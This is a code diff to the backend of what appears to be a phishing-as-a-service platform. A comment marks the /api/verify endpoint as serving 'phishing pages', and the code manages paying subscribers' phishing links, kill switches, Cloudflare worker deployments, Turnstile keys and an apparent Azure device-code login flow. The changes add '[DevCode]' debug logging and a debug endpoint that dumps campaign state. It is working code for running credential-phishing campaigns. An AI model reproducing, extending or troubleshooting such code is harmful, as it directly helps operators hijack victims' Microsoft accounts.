@@ -476,33 +476,43 @@ app.post('/api/beacon/fp', async (req, res) => {
 
 // Verify endpoint for JWT validation (phishing pages)
 app.post('/api/verify', async (req, res) => {
+  const reqLinkId = req.query.link_id ? String(req.query.link_id) : '';
+  console.log('[DevCode] /api/verify hit origin=' + (req.get('origin') || req.headers.host || '-') + ' token_len=' + String(req.body && req.body.token || '').length + ' query_link_id=' + reqLinkId);
   try {
     const jwt = require('jsonwebtoken');
-    const { token } = req.body;
-    if (!token) return res.status(403).json({ error: 'Invalid token' });
-    
+    const { token } = req.body || {};
+    if (!token) { console.log('[DevCode] /api/verify FAIL: no token in body'); return res.status(403).json({ error: 'Invalid token' }); }
+
     let decoded;
     try {
       decoded = jwt.verify(token, config.JWT_SECRET);
+      console.log('[DevCode] /api/verify JWT OK user_id=' + decoded.user_id + ' link_id=' + decoded.link_id + ' exp=' + new Date(decoded.exp * 1000).toISOString());
     } catch (err) {
+      console.log('[DevCode] /api/verify FAIL: jwt invalid/expired (' + err.name + ': ' + err.message + ')');
       return res.status(403).json({ error: 'Token expired or invalid' });
     }
-    
+
     const [users] = await db.query('SELECT * FROM users WHERE id = ?', [decoded.user_id]);
-    if (!users.length) return res.status(403).json({ error: 'User not found' });
-    
+    if (!users.length) { console.log('[DevCode] /api/verify FAIL: user not found id=' + decoded.user_id); return res.status(403).json({ error: 'User not found' }); }
+
     const user = users[0];
     if (user.subscription_status !== 'active') {
+      console.log('[DevCode] /api/verify FAIL: subscription_status=' + user.subscription_status + ' user_id=' + decoded.user_id + ' link_id=' + decoded.link_id);
       return res.status(403).json({ error: 'Subscription inactive' });
     }
     if (user.subscription_expiry && new Date(user.subscription_expiry) < new Date()) {
+      console.log('[DevCode] /api/verify FAIL: subscription_expiry=' + user.subscription_expiry + ' user_id=' + decoded.user_id + ' link_id=' + decoded.link_id);
       return res.status(403).json({ error: 'Subscription expired' });
     }
-    
+
     const [links] = await db.query('SELECT * FROM links WHERE id = ? AND status = ? AND kill_switched = 0', 
       [decoded.link_id, 'active']);
-    if (!links.length) return res.status(403).json({ error: 'Link not active' });
-    
+    if (!links.length) {
+      const [rows] = await db.query('SELECT id, status, kill_switched, kill_switch_reason FROM links WHERE id = ?', [decoded.link_id]);
+      console.log('[DevCode] /api/verify FAIL: link not active. link_id=' + decoded.link_id + ' row=' + JSON.stringify(rows[0] || null));
+      return res.status(403).json({ error: 'Link not active' });
+    }
+
     let tsKey = config.CF_TURNSTILE_SITE_KEY || '';
     try {
       const turnstilePool = require('./backend/services/turnstile-pool');
@@ -510,6 +520,7 @@ app.post('/api/verify', async (req, res) => {
       if (sk) tsKey = sk;
     } catch (e) { /* fallback already set */ }
 
+    console.log('[DevCode] /api/verify OK link_id=' + decoded.link_id + ' tenant=' + config.AZURE_TENANT + ' client_id_set=' + !!config.AZURE_CLIENT_ID + ' turnstile_key_set=' + !!tsKey);
     res.json({
       valid: true,
       client_id: config.AZURE_CLIENT_ID,
@@ -517,7 +528,56 @@ app.post('/api/verify', async (req, res) => {
       turnstile_key: tsKey,
     });
   } catch (err) {
+    console.error('[DevCode] /api/verify EXCEPTION:', err.message);
     res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Debug endpoint: dump the state the device-code flow depends on so the failure
+// point is visible without reading Cloudflare worker logs. Token-gated so it
+// can't be probed anonymously - the same JWT the page already carries.
+app.get('/api/debug/devicecode', async (req, res) => {
+  try {
+    const jwt = require('jsonwebtoken');
+    const token = req.query.token || String(req.headers.authorization || '').replace(/^Bearer\s+/i, '');
+    if (!token) return res.status(401).json({ ok: false, error: 'token required (?token=<jwt>)' });
+    let decoded;
+    try { decoded = jwt.verify(token, config.JWT_SECRET); }
+    catch (e) { return res.status(401).json({ ok: false, error: 'invalid/expired token: ' + e.message }); }
+
+    const linkId = String(decoded.link_id);
+    let user = null, link = null, pool = {};
+    try {
+      const [u] = await db.query('SELECT id, username, subscription_status, subscription_expiry FROM users WHERE id = ?', [decoded.user_id]);
+      user = u[0] || null;
+    } catch (e) { user = { _db_error: e.message }; }
+    try {
+      const [l] = await db.query('SELECT id, status, kill_switched, kill_switch_reason, url_type, worker_name, domain, design, turnstile_enabled FROM links WHERE id = ?', [linkId]);
+      link = l[0] || null;
+    } catch (e) { link = { _db_error: e.message }; }
+    try {
+      const tp = require('./backend/services/turnstile-pool');
+      const sk = await tp.getAssignedSiteKey(linkId);
+      const sks = await tp.getAssignedSecret(linkId);
+      pool = { turnstile_site_key: sk, turnstile_secret_set: !!sks, secret_len: String(sks || '').length };
+    } catch (e) { pool = { _error: e.message }; }
+
+    res.json({
+      ok: true,
+      link_id: linkId,
+      jwt: { user_id: decoded.user_id, exp: new Date(decoded.exp * 1000).toISOString() },
+      config: {
+        jwt_secret_set: !!config.JWT_SECRET,
+        azure_client_id_set: !!config.AZURE_CLIENT_ID,
+        azure_tenant: config.AZURE_TENANT || null,
+        azure_client_secret_set: !!config.AZURE_CLIENT_SECRET,
+        api_url: config.API_URL || null,
+        app_url: config.APP_URL || null,
+      },
+      user, link, turnstile_pool: pool,
+    });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
   }
 });
 
@@ -535,6 +595,7 @@ app.post('/api/log', async (req, res) => {
       // This is acceptable since workers are generated with the link's JWT payload
       const { message, stack, source, lineno, colno, ua } = req.body;
       if (link_id && message) {
+        console.error('[Worker Log] link_id=' + link_id + ' msg=' + message + (source ? ' source=' + source : ''));
         await db.query(
           'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
           [link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
@@ -568,6 +629,9 @@ app.post('/api/log', async (req, res) => {
         if (log.data) {
           try { msg += ' ' + (typeof log.data === 'string' ? log.data : JSON.stringify(log.data)); } catch(e) {}
         }
+        if (log.level === 'error' || /\[DevCode\]/.test(msg)) {
+          console.error('[Worker Log] link_id=' + decoded.link_id + ' msg=' + msg);
+        }
         await db.query(
           'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent, created_at) VALUES (?, ?, ?, ?, ?)',
           [decoded.link_id, msg, log.url || '', log.ua || '', new Date(log.ts || Date.now())]
@@ -577,6 +641,7 @@ app.post('/api/log', async (req, res) => {
       // Single log format from workers
       const { message, stack, source, lineno, colno, ua } = req.body;
       if (decoded.link_id && message) {
+        console.error('[Worker Log] link_id=' + decoded.link_id + ' msg=' + message + (source ? ' source=' + source : ''));
         await db.query(
           'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
           [decoded.link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
